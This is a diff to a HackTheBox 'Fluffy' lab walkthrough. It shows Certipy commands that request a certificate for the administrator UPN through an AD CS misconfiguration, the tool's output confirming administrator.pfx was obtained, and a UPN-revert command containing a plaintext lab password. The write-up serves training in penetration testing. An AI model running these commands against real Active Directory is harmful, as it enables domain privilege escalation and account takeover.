@@ -697,5 +697,23 @@ export KRB5CCNAME=ca_svc.ccache
 ```
 Then request the certificate:
 ```bash
-certipy req -k -dc-ip '10.10.11.69' -target 'DC01-fluffy.htb' -ca 'fluffy-DC01-CA'  -template 'User'
+certipy req -k -dc-ip '10.10.11.69' -dc-host DC01.fluffy.htb -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+```
+Output
+```bash
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 16
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+
+```
+Now revert back the UPN of ca_svc
+```bash
+certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
 ```
